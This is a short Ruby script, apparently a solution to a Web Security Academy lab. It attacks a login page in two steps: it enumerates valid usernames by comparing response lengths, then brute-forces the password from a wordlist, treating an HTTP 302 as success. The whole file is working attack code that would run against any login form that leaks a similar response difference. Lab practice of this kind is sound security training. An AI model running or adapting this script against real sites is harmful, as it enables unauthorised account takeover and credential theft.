require 'http'

url = 'https://0ad30031044293e9804235e50080001c.web-security-academy.net/login'

client = HTTP.headers(
	"User-Agent"=>"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0"
	).cookies(
		:session=>"5KZIcI6A9wvE69IJeq8O7RysDSjwIWcN"
		)

fhu = File.new 'users.txt','r'
fhp = File.new 'passwd.txt','r'
users = fhu.readlines
passwd = fhp.readlines
fhu.close
fhp.close

valid_username = ''

# Enumerate Valid Username invalid:3140 valid!3140
users.count.times  do |i|
	resp = client.post(url,:form => {:username=>"#{users[i].chomp}",:password=>"test"})
	length = resp.body.to_s.length
	if length!=3140
		valid_username = users[i].chomp
		puts "Username : #{users[i].chomp}"
		break
	end
end

# Enumerate Valid Password 
passwd.count.times do |i|
	resp = client.post(url,:form => {:username=>"#{valid_username}",:password=>"#{passwd[i].chomp}"})
	code = resp.code
	if code==302
		puts "Password : #{passwd[i].chomp}"
		break
	end
end
